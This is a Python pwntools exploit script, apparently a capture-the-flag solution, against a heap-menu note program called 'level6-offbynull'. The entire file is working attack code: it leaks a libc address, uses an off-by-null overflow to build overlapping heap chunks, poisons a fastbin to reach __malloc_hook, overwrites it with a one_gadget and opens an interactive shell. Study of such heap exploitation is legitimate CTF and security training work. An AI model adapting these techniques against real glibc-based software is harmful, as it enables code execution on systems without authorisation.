#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level6-offbynull"
#elf=ELF(pwn_file)
libc=ELF("./libc.so.6")


if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22507)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def addnote(size):
    r.sendlineafter(">> ","1")
    r.sendlineafter("Size:",str(size))

def deletenote(nid):
    r.sendlineafter(">> ", "4")
    r.sendlineafter("Input your id:", str(nid))

def shownote(nid):
    r.sendlineafter(">> ","2")
    r.sendlineafter("Input your id:",str(nid))


def editnote(nid,content):
    r.sendlineafter(">> ","3")
    r.sendlineafter("id:",str(nid))
    r.sendafter("Content:", content)


addnote(0x140) # 0
addnote(0x30) # 1
deletenote(0)
addnote(0x140) #0
shownote(0)

w = r.recv(6)
main_arena_80_addr = u64(w + chr(0)*2)

print hex(main_arena_80_addr)
libc.address = main_arena_80_addr - (0x7ffff7dd1b78 - 0x7ffff7a0d000)
print hex(libc.address)

addnote(0x108) # A-> 2

editnote(2,'1'*3 + '\n')
addnote(0x68)  # B-> 3
addnote(0xf8) # C-> 4


deletenote(2)
content_B = 'a'*0x60 + p64(0x110 + 0x70) 
editnote(3, content_B) 

deletenote(4)
deletenote(3)
length = 0x110 + 0x70 + 0x100
addnote(length) #2

one_gadget = libc.address + 0xf02a4
malloc_block = libc.sym['__malloc_hook'] - 0x23 

payload = 'a'*0x108 + p64(0x70 +1) + p64(malloc_block)
payload += '\n'
editnote(2, payload)

addnote(0x68) #3
addnote(0x68) #4

payload2 = 'a'*19 + p64(one_gadget) + '\n'
editnote(4,payload2)

deletenote(4)

r.interactive()
